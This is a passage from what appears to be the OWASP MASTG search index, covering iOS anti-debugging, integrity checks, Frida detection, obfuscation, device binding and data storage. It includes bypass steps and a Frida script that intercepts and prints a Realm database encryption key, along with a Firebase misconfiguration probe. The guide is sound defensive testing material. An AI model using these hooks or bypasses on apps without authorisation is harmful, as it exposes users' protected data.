Objective-C or Swift as shown here:</p> <pre><code>func AmIBeingDebugged() -&gt; Bool {\n    return getppid() != 1\n}\n</code></pre> <p>Bypass: Similarly to the other techniques, this has also a trivial bypass (e.g. by patching the binary or by using Frida hooks).</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0086/","title":"MASTG-KNOW-0086: File Integrity Checks","text":"<p>There are two common approaches to check file integrity: using application source code integrity checks and using file storage integrity checks.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0086/#application-source-code-integrity-checks","title":"Application Source Code Integrity Checks","text":"<p>In \"Debugging\" ( Debugging), we discuss the iOS IPA application signature check. We also learn that determined reverse engineers can bypass this check by re-packaging and re-signing an app using a developer or enterprise certificate. One way to make this harder is to add a custom check that determines whether the signatures still match at runtime.</p> <p>Apple takes care of integrity checks with DRM. However, additional controls (such as in the example below) are possible. The <code>mach_header</code> is parsed to calculate the start of the instruction data, which is used to generate the signature. Next, the signature is compared to the given signature. Make sure that the generated signature is stored or coded somewhere else.</p> <pre><code>int xyz(char *dst) {\n    const struct mach_header * header;\n    Dl_info dlinfo;\n\n    if (dladdr(xyz, &amp;dlinfo) == 0 || dlinfo.dli_fbase == NULL) {\n        NSLog(@\" Error: Could not resolve symbol xyz\");\n        [NSThread exit];\n    }\n\n    while(1) {\n\n        header = dlinfo.dli_fbase;  // Pointer on the Mach-O header\n        struct load_command * cmd = (struct load_command *)(header + 1); // First load command\n        // Now iterate through load command\n        //to find __text section of __TEXT segment\n        for (uint32_t i = 0; cmd != NULL &amp;&amp; i &lt; header-&gt;ncmds; i++) {\n            if (cmd-&gt;cmd == LC_SEGMENT) {\n                // __TEXT load command is a LC_SEGMENT load command\n                struct segment_command * segment = (struct segment_command *)cmd;\n                if (!strcmp(segment-&gt;segname, \"__TEXT\")) {\n                    // Stop on __TEXT segment load command and go through sections\n                    // to find __text section\n                    struct section * section = (struct section *)(segment + 1);\n                    for (uint32_t j = 0; section != NULL &amp;&amp; j &lt; segment-&gt;nsects; j++) {\n                        if (!strcmp(section-&gt;sectname, \"__text\"))\n                            break; //Stop on __text section load command\n                        section = (struct section *)(section + 1);\n                    }\n                    // Get here the __text section address, the __text section size\n                    // and the virtual memory address so we can calculate\n                    // a pointer on the __text section\n                    uint32_t * textSectionAddr = (uint32_t *)section-&gt;addr;\n                    uint32_t textSectionSize = section-&gt;size;\n                    uint32_t * vmaddr = segment-&gt;vmaddr;\n                    char * textSectionPtr = (char *)((int)header + (int)textSectionAddr - (int)vmaddr);\n                    // Calculate the signature of the data,\n                    // store the result in a string\n                    // and compare to the original one\n                    unsigned char digest[CC_MD5_DIGEST_LENGTH];\n                    CC_MD5(textSectionPtr, textSectionSize, digest);     // calculate the signature\n                    for (int i = 0; i &lt; sizeof(digest); i++)             // fill signature\n                        sprintf(dst + (2 * i), \"%02x\", digest[i]);\n\n                    // return strcmp(originalSignature, signature) == 0;    // verify signatures match\n\n                    return 0;\n                }\n            }\n            cmd = (struct load_command *)((uint8_t *)cmd + cmd-&gt;cmdsize);\n        }\n    }\n\n}\n</code></pre> <p>Bypass:</p> <ol> <li>Patch the anti-debugging functionality and disable the unwanted behavior by overwriting the associated code with NOP instructions.</li> <li>Patch any stored hash that's used to evaluate the integrity of the code.</li> <li>Use Frida to hook file system APIs and return a handle to the original file instead of the modified file.</li> </ol>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0086/#file-storage-integrity-checks","title":"File Storage Integrity Checks","text":"<p>Apps might choose to ensure the integrity of the application storage itself, by creating an HMAC or signature over either a given key-value pair or a file stored on the device, e.g. in the Keychain, <code>UserDefaults</code>/<code>NSUserDefaults</code>, or any database.</p> <p>For example, an app might contain the following code to generate an HMAC with <code>CommonCrypto</code>:</p> <pre><code>    // Allocate a buffer to hold the digest and perform the digest.\n    NSMutableData* actualData = [getData];\n    //get the key from the keychain\n    NSData* key = [getKey];\n    NSMutableData* digestBuffer = [NSMutableData dataWithLength:CC_SHA256_DIGEST_LENGTH];\n    CCHmac(kCCHmacAlgSHA256, [actualData bytes], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [digestBuffer mutableBytes]);\n    [actualData appendData: digestBuffer];\n</code></pre> <p>This script performs the following steps:</p> <ol> <li>Get the data as <code>NSMutableData</code>.</li> <li>Get the data key (typically from the Keychain).</li> <li>Calculate the hash value.</li> <li>Append the hash value to the actual data.</li> <li>Store the results of step 4.</li> </ol> <p>After that, it might be verifying the HMACs by doing the following:</p> <pre><code>  NSData* hmac = [data subdataWithRange:NSMakeRange(data.length - CC_SHA256_DIGEST_LENGTH, CC_SHA256_DIGEST_LENGTH)];\n  NSData* actualData = [data subdataWithRange:NSMakeRange(0, (data.length - hmac.length))];\n  NSMutableData* digestBuffer = [NSMutableData dataWithLength:CC_SHA256_DIGEST_LENGTH];\n  CCHmac(kCCHmacAlgSHA256, [actualData bytes], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [digestBuffer mutableBytes]);\n  return [hmac isEqual: digestBuffer];\n</code></pre> <ol> <li>Extracts the message and the hmacbytes as separate <code>NSData</code>.</li> <li>Repeats steps 1-3 of the procedure for generating an HMAC on the <code>NSData</code>.</li> <li>Compares the extracted HMAC bytes to the result of step 1.</li> </ol> <p>Note: if the app also encrypts files, make sure that it encrypts and then calculates the HMAC as described in Authenticated Encryption.</p> <p>Bypass:</p> <ol> <li>Retrieve the data from the device, as described in  Device Binding.</li> <li>Alter the retrieved data and return it to storage.</li> </ol>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0087/","title":"MASTG-KNOW-0087: Reverse Engineering Tools Detection","text":"<p>The presence of tools, frameworks and apps commonly used by reverse engineers may indicate an attempt to reverse engineer the app. Some of these tools can only run on a jailbroken device, while others force the app into debugging mode or depend on starting a background service on the mobile phone. Therefore, there are different ways that an app may implement to detect a reverse engineering attack and react to it, e.g. by terminating itself.</p> <p>You can detect popular reverse engineering tools that have been installed in an unmodified form by looking for associated application packages, files, processes, or other tool-specific modifications and artifacts. In the following examples, we'll discuss different ways to detect the Frida instrumentation framework, which is used extensively in this guide and also in the real world. Other tools, such as ElleKit, can be detected similarly. Note that injection, hooking and DBI (Dynamic Binary Instrumentation) tools can often be detected implicitly, through runtime integrity checks, which are discussed below.</p> <p>Bypass:</p> <p>The following steps should guide you when bypassing detection of reverse engineering tools:</p> <ol> <li>Patch the anti reverse engineering functionality. Disable the unwanted behavior by patching the binary through usage of radare2/iaito or Ghidra.</li> <li>Use Frida or ElleKit to hook file system APIs on the Objective-C/Swift or native layers. Return a handle to the original file, not the modified file.</li> </ol>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0087/#frida-detection","title":"Frida Detection","text":"<p>Frida runs under the name of frida-server in its default configuration (injected mode) on a jailbroken device. When you explicitly attach to a target app (e.g. via frida-trace or the Frida CLI), Frida injects a frida-agent into the memory of the app. Therefore, you may expect to find it there after attaching to the app (and not before). On Android, verifying this is pretty straightforward as you can simply grep for the string \"frida\" in the memory maps of the process ID in the <code>proc</code> directory (<code>/proc/&lt;pid&gt;/maps</code>). However, on iOS the <code>proc</code> directory is not available, but you can list the loaded dynamic libraries in an app with the function <code>_dyld_image_count</code>.</p> <p>Frida may also run in the so-called embedded mode, which also works for non-jailbroken devices. It consists of embedding a frida-gadget into the IPA and forcing the app to load it as one of its native libraries.</p> <p>The application's static content, including its ARM-compiled binary and its external libraries, is stored inside the <code>&lt;Application&gt;.app</code> directory. If you inspect the content of the <code>/var/containers/Bundle/Application/&lt;UUID&gt;/&lt;Application&gt;.app</code> directory, you'll find the embedded frida-gadget as FridaGadget.dylib.</p> <pre><code>iPhone:/var/containers/Bundle/Application/AC5DC1FD-3420-42F3-8CB5-E9D77C4B287A/SwiftSecurity.app/Frameworks root# ls -alh\ntotal 87M\ndrwxr-xr-x 10 _installd _installd  320 Nov 19 06:08 ./\ndrwxr-xr-x 11 _installd _installd  352 Nov 19 06:08 ../\n-rw-r--r--  1 _installd _installd  70M Nov 16 06:37 FridaGadget.dylib\n-rw-r--r--  1 _installd _installd 3.8M Nov 16 06:37 libswiftCore.dylib\n-rw-r--r--  1 _installd _installd  71K Nov 16 06:37 libswiftCoreFoundation.dylib\n-rw-r--r--  1 _installd _installd 136K Nov 16 06:38 libswiftCoreGraphics.dylib\n-rw-r--r--  1 _installd _installd  99K Nov 16 06:37 libswiftDarwin.dylib\n-rw-r--r--  1 _installd _installd 189K Nov 16 06:37 libswiftDispatch.dylib\n-rw-r--r--  1 _installd _installd 1.9M Nov 16 06:38 libswiftFoundation.dylib\n-rw-r--r--  1 _installd _installd  76K Nov 16 06:37 libswiftObjectiveC.dylib\n</code></pre> <p>Looking at these traces that Frida leaves behind, you might already imagine that detecting Frida would be a trivial task. And while it is trivial to detect these libraries, it is equally trivial to bypass such a detection. Detection of tools is a cat and mouse game and things can get much more complicated. The following table shortly presents a set of some typical Frida detection methods and a short discussion on their effectiveness.</p> <p>Some of the following detection methods are implemented in  IOSSecuritySuite</p> Method Description Discussion Check The Environment For Related Artifacts Artifacts can be packaged files, binaries, libraries, processes, and temporary files. For Frida, this could be the frida-server running in the target (jailbroken) system (the daemon responsible for exposing Frida over TCP) or the frida libraries loaded by the app. Inspecting running services is not possible for an iOS app on a non-jailbroken device. The Swift method CommandLine is not available on iOS to query for information about running processes, but there are unofficial ways, such as by using NSTask. Nevertheless when using this method, the app will be rejected during the App Store review process. There is no other public API available to query for running processes or execute system commands within an iOS App. Even if it would be possible, bypassing this would be as easy as just renaming the corresponding Frida artifact (frida-server/frida-gadget/frida-agent). Another way to detect Frida, would be to walk through the list of loaded libraries and check for suspicious ones (e.g. those including \"frida\" in their names), which can be done by using <code>_dyld_get_image_name</code>. Checking For Open TCP Ports The frida-server process binds to TCP port 27042 by default. Testing whether this port is open is another method of detecting the daemon. This method detects frida-server in its default mode, but the listening port can be changed via a command line argument, so bypassing this is very trivial. Checking For Ports Responding To D-Bus Auth <code>frida-server</code> uses the D-Bus protocol to communicate, so you can expect it to respond to D-Bus AUTH. Send a D-Bus AUTH message to every open port and check for an answer, hoping that <code>frida-server</code> will reveal itself. This is a fairly robust method of detecting <code>frida-server</code>, but Frida offers alternative modes of operation that don't require frida-server. <p>Please remember that this table is far from exhaustive. For example, two other possible detection mechanisms are:</p> <ul> <li>named pipes (used by frida-server for external communication), or</li> <li>detecting trampolines (see \"Prevent bypassing of SSL certificate pinning in iOS applications\" for further explanation and sample code for detection of trampolines in an iOS app)</li> </ul> <p>Both would help to detect Substrate or Frida's Interceptor but, for example, won't be effective against Frida's Stalker. Remember that the success of each of these detection methods will depend on whether you're using a jailbroken device, the specific version of the jailbreak and method and/or the version of the tool itself. At the end, this is part of the cat and mouse game of protecting data being processed on an uncontrolled environment (the end user's device).</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0088/","title":"MASTG-KNOW-0088: Emulator Detection","text":"<p>The goal of emulator detection is to increase the difficulty of running the app on an emulated device. This forces the reverse engineer to defeat the emulator checks or utilize the physical device, thereby barring the access required for large-scale device analysis.</p> <p>As discussed in the section Testing on the iOS Simulator in the basic security testing chapter, the only available simulator is the one that ships with Xcode. Simulator binaries are compiled to x86 code instead of ARM code and apps compiled for a real device (ARM architecture) don't run in the simulator, hence simulation protection was not so much a concern regarding iOS apps in contrast to Android with a wide range of emulation choices available.</p> <p>However, since its release, Corellium (commercial tool) has enabled real emulation, setting itself apart from the iOS simulator. In addition to that, being a SaaS solution, Corellium enables large-scale device analysis with the limiting factor just being available funds.</p> <p>With Apple Silicon (ARM) hardware widely available, traditional checks for the presence of x86 / x64 architecture might not suffice. One potential detection strategy is to identify features and limitations available for commonly used emulation solutions. For instance, Corellium doesn't support iCloud, cellular services, camera, NFC, Bluetooth, App Store access or GPU hardware emulation (Metal). Therefore, smartly combining checks involving any of these features could be an indicator for the presence of an emulated environment.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/","title":"MASTG-KNOW-0089: Obfuscation","text":"<p>The chapter \"Mobile App Tampering and Reverse Engineering\" introduces several well-known obfuscation techniques that can be used in mobile apps in general.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#name-obfuscation","title":"Name Obfuscation","text":"<p>The standard compiler generates binary symbols based on class and function names from the source code. Therefore, if no obfuscation was applied, symbol names remain meaningful and can be easily read straight from the app binary. For instance, a function which detects a jailbreak can be located by searching for relevant keywords (e.g. \"jailbreak\"). The listing below shows the disassembled function <code>JailbreakDetectionViewController.jailbreakTest4Tapped</code> from the  DVIA-v2.</p> <pre><code>__T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF:\nstp        x22, x21, [sp, #-0x30]!\nmov        rbp, rsp\n</code></pre> <p>After the obfuscation we can observe that the symbol's name is no longer meaningful as shown on the listing below.</p> <pre><code>__T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF:\nstp        x22, x21, [sp, #-0x30]!\nmov        rbp, rsp\n</code></pre> <p>Nevertheless, this only applies to the names of functions, classes and fields. The actual code remains unmodified, so an attacker can still read the disassembled version of the function and try to understand its purpose (e.g. to retrieve the logic of a security algorithm).</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#instruction-substitution","title":"Instruction Substitution","text":"<p>This technique replaces standard binary operators like addition or subtraction with more complex representations. For example an addition <code>x = a + b</code> can be represented as <code>x = -(-a) - (-b)</code>. However, using the same replacement representation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introduce a random factor. This technique is vulnerable to deobfuscation, but depending on the complexity and depth of the substitutions, applying it can still be time consuming.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#control-flow-flattening","title":"Control Flow Flattening","text":"<p>Control flow flattening replaces original code with a more complex representation. The transformation breaks the body of a function into basic blocks and puts them all inside a single infinite loop with a switch statement that controls the program flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs that usually make the code easier to read.</p> <p></p> <p>The image shows how control flow flattening alters code. See \"Obfuscating C++ programs via control flow flattening\" for more information.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#dead-code-injection","title":"Dead Code Injection","text":"<p>This technique makes the program's control flow more complex by injecting dead code into the program. Dead code is a stub of code that doesn't affect the original program's behaviour but increases the overhead for the reverse engineering process.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#string-encryption","title":"String Encryption","text":"<p>Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are stored in plaintext in the data section of an application's binary. This technique encrypts these values and injects stubs of code into the program that will decrypt that data before it is used by the program.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0089/#recommended-tools","title":"Recommended Tools","text":"<ul> <li> SwiftShield can be used to perform name obfuscation. It reads the source code of the Xcode project and replaces all names of classes, methods and fields with random values before the compiler is used.</li> <li>obfuscator-llvm operates on the Intermediate Representation (IR) instead of the source code. It can be used for symbol obfuscation, string encryption and control flow flattening. Since it's based on IR, it can hide out significantly more information about the application as compared to SwiftShield.</li> </ul> <p>Learn more about iOS obfuscation techniques in the paper \"Protecting Million-User iOS Apps with Obfuscation: Motivations, Pitfalls, and Experience\".</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0090/","title":"MASTG-KNOW-0090: Device Binding","text":"<p>The purpose of device binding is to impede an attacker who tries to copy an app and its state from device A to device B and continue the execution of the app on device B. After device A has been determined trusted, it may have more privileges than device B. This situation shouldn't change when an app is copied from device A to device B.</p> <p>Since iOS 7.0, hardware identifiers (such as MAC addresses) are off-limits but there are other methods for implementing device binding in iOS:</p> <ul> <li><code>identifierForVendor</code>: You can use <code>[[UIDevice currentDevice] identifierForVendor]</code> (in Objective-C), <code>UIDevice.current.identifierForVendor?.uuidString</code> (in Swift3), or <code>UIDevice.currentDevice().identifierForVendor?.UUIDString</code> (in Swift2). The value of <code>identifierForVendor</code> may not be the same if you reinstall the app after other apps from the same vendor are installed and it may change when you update your app bundle's name. Therefore it is best to combine it with something in the Keychain.</li> <li>Using the Keychain: You can store something in the Keychain to identify the application's instance. To make sure that this data is not backed up, use <code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code> (if you want to secure the data and properly enforce a passcode or Touch ID requirement), <code>kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly</code>, or <code>kSecAttrAccessibleWhenUnlockedThisDeviceOnly</code>.</li> <li>Using Google Instance ID: see the implementation for iOS here.</li> </ul> <p>Any scheme based on these methods will be more secure the moment a passcode and/or Touch ID is enabled, the materials stored in the Keychain or filesystem are protected with protection classes (such as <code>kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly</code> and <code>kSecAttrAccessibleWhenUnlockedThisDeviceOnly</code>), and the <code>SecAccessControlCreateFlags</code> is set either with <code>kSecAccessControlDevicePasscode</code> (for passcodes), <code>kSecAccessControlUserPresence</code> (passcode, Face ID or Touch ID), <code>kSecAccessControlBiometryAny</code> (Face ID or Touch ID) or <code>kSecAccessControlBiometryCurrentSet</code> (Face ID / Touch ID: but current enrolled biometrics only).</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0091/","title":"MASTG-KNOW-0091: File System APIs","text":"<p>The FileManager interface lets you examine and change the contents of the file system. You can use <code>createFile(atPath:contents:attributes:)</code> to create a file and write to it.</p> <p>The following example shows how to store a file in the app's documents directory with complete protection, meaning that the file is encrypted and can only be accessed when the device is unlocked.</p> <pre><code>FileManager.default.createFile(\n    atPath: filePath,\n    contents: \"secret text\".data(using: .utf8),\n    attributes: [FileAttributeKey.protectionKey: FileProtectionType.complete]\n)\n</code></pre> <p>You can find more information in the Apple Developer Documentation \"Encrypting Your App's Files\"</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0092/","title":"MASTG-KNOW-0092: Binary Data Storage","text":"<p><code>NSData</code> (static data objects) and <code>NSMutableData</code> (dynamic data objects) are typically used for data storage, but they are also useful for distributed objects applications, in which data contained in data objects can be copied or moved between applications.</p> <p>When writing <code>NSData</code> objects using <code>write(to:options:)</code>, you can specify <code>WritingOptions</code> for file protection:</p> <ul> <li><code>noFileProtection</code>: does not encrypt the file.</li> <li><code>completeFileProtection</code>: ensures the file is encrypted and can only be accessed when the device is unlocked.</li> <li><code>completeFileProtectionUnlessOpen</code>: ensures the file is encrypted and can only be accessed when the device is unlocked or the file is already open.</li> <li><code>completeFileProtectionUntilFirstUserAuthentication</code>: ensures the file is encrypted and can only be accessed until the first user authentication after a reboot.</li> </ul>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0093/","title":"MASTG-KNOW-0093: UserDefaults","text":"<p>The <code>UserDefaults</code> class, part of the <code>Preferences</code> API, provides a programmatic interface for storing key-value pairs across app launches. It stores data in a plist file within the app sandbox and is intended for small, non-sensitive data.</p> <p><code>UserDefaults</code> supports common types like <code>NSData</code>, <code>NSString</code>, <code>NSNumber</code>, <code>NSDate</code>, and <code>NSArray</code>. Other types must be converted to <code>NSData</code>.</p> <p>Data is stored locally and included in device backups, except on managed educational devices.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0094/","title":"MASTG-KNOW-0094: CoreData","text":"<p><code>Core Data</code> is a framework for managing the model layer of objects in your application. It provides general and automated solutions to common tasks associated with object life cycles and object graph management, including persistence. Core Data can use SQLite as its persistent store, but the framework itself is not a database.</p> <p>CoreData does not encrypt its data by default. As part of a research project (iMAS) from the MITRE Corporation, that was focused on open source iOS security controls, an additional encryption layer can be added to CoreData. See the GitHub Repo for more details.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0095/","title":"MASTG-KNOW-0095: Firebase Real-time Databases","text":"<p>Firebase is a development platform with more than 15 products, and one of them is Firebase Real-time Database. It can be leveraged by application developers to store and sync data with a NoSQL cloud-hosted database. The data is stored as JSON and is synchronized in real-time to every connected client and also remains available even when the application goes offline.</p> <p>A misconfigured Firebase instance can be identified by making the following network call:</p> <p><code>https://\\&lt;firebaseProjectName\\&gt;.firebaseio.com/.json</code></p> <p>The firebaseProjectName can be retrieved from the property list(.plist) file. For example, <code>PROJECT_ID</code> key stores the corresponding Firebase project name in GoogleService-Info.plist file.</p> <p>Alternatively, the analysts can use Firebase Scanner, a python script that automates the task above as shown below:</p> <pre><code>python FirebaseScanner.py -f &lt;commaSeparatedFirebaseProjectNames&gt;\n</code></pre>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0096/","title":"MASTG-KNOW-0096: Realm Databases","text":"<p>Realm Objective-C and Realm Swift aren't supplied by Apple, but they are still worth noting. They store everything unencrypted, unless the configuration has encryption enabled.</p> <p>The following example demonstrates how to use encryption with a Realm database:</p> <pre><code>// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server\nlet config = Realm.Configuration(encryptionKey: getKey())\ndo {\n  let realm = try Realm(configuration: config)\n  // Use the Realm as normal\n} catch let error as NSError {\n  // If the encryption key is wrong, `error` will say that it's an invalid database\n  fatalError(\"Error opening realm: \\(error)\")\n}\n</code></pre> <p>Access to the data depends on the encryption: unencrypted databases are easily accessible, while encrypted ones require investigation into how the key is managed - whether it's hardcoded or stored unencrypted in an insecure location such as shared preferences, or securely in the platform's KeyStore (which is best practice). However, if an attacker has sufficient access to the device (e.g. jailbroken access) or can repackage the app, they can still retrieve encryption keys at runtime using tools like Frida. The following Frida script demonstrates how to intercept the Realm encryption key and access the contents of the encrypted database.</p> <pre><code>function nsdataToHex(data) {\n    var hexStr = '';\n    for (var i = 0; i &lt; data.length(); i++) {\n        var byte = Memory.readU8(data.bytes().add(i));\n        hexStr += ('0' + (byte &amp; 0xFF).toString(16)).slice(-2);\n    }\n    return hexStr;\n}\n\nfunction HookRealm() {\n    if (ObjC.available) {\n        console.log(\"ObjC is available. Attempting to intercept Realm classes...\");\n        const RLMRealmConfiguration = ObjC.classes.RLMRealmConfiguration;\n        Interceptor.attach(ObjC.classes.RLMRealmConfiguration['- setEncryptionKey:'].implementation, {\n            onEnter: function(args) {\n                var encryptionKeyData = new ObjC.Object(args[2]);\n                console.log(`Encryption Key Length: ${encryptionKeyData.length()}`);\n                // Hexdump the encryption key\n                var encryptionKeyBytes = encryptionKeyData.bytes();\n                console.log(hexdump(encryptionKeyBytes, {\n                    offset: 0,\n                    length: encryptionKeyData.length(),\n                    header: true,\n                    ansi: true\n                }));\n\n                // Convert the encryption key bytes to a hex string\n                var encryptionKeyHex = nsdataToHex(encryptionKeyData);\n                console.log(`Encryption Key Hex: ${encryptionKeyHex}`);\n            },\n            onLeave: function(retval) {\n                console.log('Leaving RLMRealmConfiguration.- setEncryptionKey:');\n            }\n        });\n\n    }\n\n}\n</code></pre>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0097/","title":"MASTG-KNOW-0097: Other Third-Party Databases","text":"","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0097/#sqlite3","title":"SQLite3","text":"<p>The SQLite3 library must be added to an app if the app is to use SQLite. This library is a C++ wrapper that provides an API for the SQLite commands.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0097/#couchbase-lite","title":"Couchbase Lite","text":"<p>Couchbase Lite is a lightweight, embedded, document-oriented (NoSQL) database engine that can be synced. It compiles natively for iOS and macOS.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0098/","title":"MASTG-KNOW-0098: User Interface Components","text":"<p>Entering sensitive information when, for example, registering an account or making payments, is an essential part of using many apps. This data may be financial information such as credit card data or user account passwords. The data may be exposed if the app doesn't properly mask it while it is being typed.</p> <p>In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be present it should be properly masked, typically by showing asterisks or dots instead of clear text.</p> <p>Carefully review all UI components that either show such information or take it as input. Search for any traces of sensitive information and evaluate if it should be masked or completely removed.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0099/","title":"MASTG-KNOW-0099: Screenshots","text":"<p>Manufacturers want to provide device users with an aesthetically pleasing effect when an application is started or exited, so they introduced the concept of saving a screenshot when the application goes into the background. This feature can pose a security risk because screenshots (which may display sensitive information such as an email or corporate documents) are written to local storage, where they can be recovered by a rogue application with a sandbox bypass exploit or someone who steals the device.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0100/","title":"MASTG-KNOW-0100: Keyboard Cache","text":"<p>Several options, such as autocorrect and spell check, are available to users to simplify keyboard input and are cached by default in <code>.dat</code> files in <code>/private/var/mobile/Library/Keyboard/</code> and its subdirectories.</p> <p>The UITextInputTraits protocol is used for keyboard caching. The <code>UITextField</code>, <code>UITextView</code>, and <code>UISearchBar</code> classes automatically support this protocol and it offers the following properties:</p> <ul> <li><code>var autocorrectionType: UITextAutocorrectionType</code> determines whether autocorrection is enabled during typing. When autocorrection is enabled, the text object tracks unknown words and suggests suitable replacements, replacing the typed text automatically unless the user overrides the replacement. The default value of this property is <code>UITextAutocorrectionTypeDefault</code>, which for most input methods enables autocorrection.</li> <li><code>var secureTextEntry: BOOL</code> determines whether text copying and text caching are disabled and hides the text being entered for <code>UITextField</code>. The default value of this property is <code>NO</code>.</li> </ul>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0101/","title":"MASTG-KNOW-0101: Logs","text":"<p>There are many legitimate reasons for creating log files on a mobile device, including keeping track of crashes or errors that are stored locally while the device is offline (so that they can be sent to the app's developer once online), and storing usage statistics. However, logging sensitive data, such as credit card numbers and session information, may expose the data to attackers or malicious applications. Log files can be created in several ways. The following list shows the methods available on iOS:</p> <ul> <li>NSLog Method</li> <li>printf-like function</li> <li>NSAssert-like function</li> <li>Macro</li> </ul>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0102/","title":"MASTG-KNOW-0102: Backups","text":"<p>iOS includes auto-backup features that create copies of the data stored on the device. You can make iOS backups from your host computer by using iTunes (till macOS Catalina) or Finder (from macOS Catalina onwards), or via the iCloud backup feature. In both cases, the backup includes nearly all data stored on the iOS device except highly sensitive data such as Apple Pay information and Touch ID settings.</p> <p>Since iOS backs up installed apps and their data, an obvious concern is whether sensitive user data stored by the app might unintentionally leak through the backup. Another concern, though less obvious, is whether sensitive configuration settings used to protect data or restrict app functionality could be tampered to change app behavior after restoring a modified backup. Both concerns are valid and these vulnerabilities have proven to exist in a vast number of apps today.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0102/#how-the-keychain-is-backed-up","title":"How the Keychain Is Backed Up","text":"<p>When users back up their iOS device, the Keychain data is backed up as well, but the secrets in the Keychain remain encrypted. The class keys necessary to decrypt the Keychain data aren't included in the backup. Restoring the Keychain data requires restoring the backup to a device and unlocking the device with the users passcode.</p> <p>Keychain items for which the <code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code> attribute is set can be decrypted only if the backup is restored to the backed up device. Someone trying to extract this Keychain data from the backup couldn't decrypt it without access to the crypto hardware inside the originating device.</p> <p>One caveat to using the Keychain, however, is that it was only designed to store small bits of user data or short notes (according to Apple's documentation on Keychain Services). This means that apps with larger local secure storage needs (e.g., messaging apps, etc.) should encrypt the data within the app container, but use the Keychain to store key material. In cases where sensitive configuration settings (e.g., data loss prevention policies, password policies, compliance policies, etc) must remain unencrypted within the app container, you can consider storing a hash of the policies in the keychain for integrity checking. Without an integrity check, these settings could be modified within a backup and then restored back to the device to modify app behavior (e.g., change configured remote endpoints) or security settings (e.g., jailbreak detection, certificate pinning, maximum UI login attempts, etc.).</p> <p>The takeaway: If sensitive data is handled as recommended earlier in this chapter (e.g., stored in the Keychain, with Keychain backed integrity checks, or encrypted with a key that's locked inside the Keychain), backups shouldn't be security 